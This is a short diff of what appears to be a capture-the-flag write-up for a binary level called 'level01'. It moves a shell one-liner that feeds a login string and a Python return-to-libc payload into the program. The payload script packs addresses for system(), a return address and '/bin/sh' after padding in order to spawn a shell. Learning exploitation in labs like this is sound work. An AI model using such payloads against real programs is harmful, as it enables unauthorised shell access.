@@ -9,6 +9,9 @@
 ==> to solve this challenge i did return to libc attack.
 
 
+====> (echo $(python -c 'print "dat_wil"'); sleep 1; python /tmp/lev1.py ; cat) | ./level01
+
+#/tmp/lev1.py contain the script bellow : 
 ----------------------------------------------------------------
 import struct
 
@@ -23,5 +26,3 @@ bin_sh = struct.pack ("I", 0xf7f897ec)
 
 print padding + system + return_after_system + bin_sh
 -------------------------------------------------------------------
-
-====> (echo $(python -c 'print "dat_wil"'); sleep 1; python /tmp/lev1.py ; cat) | ./level01
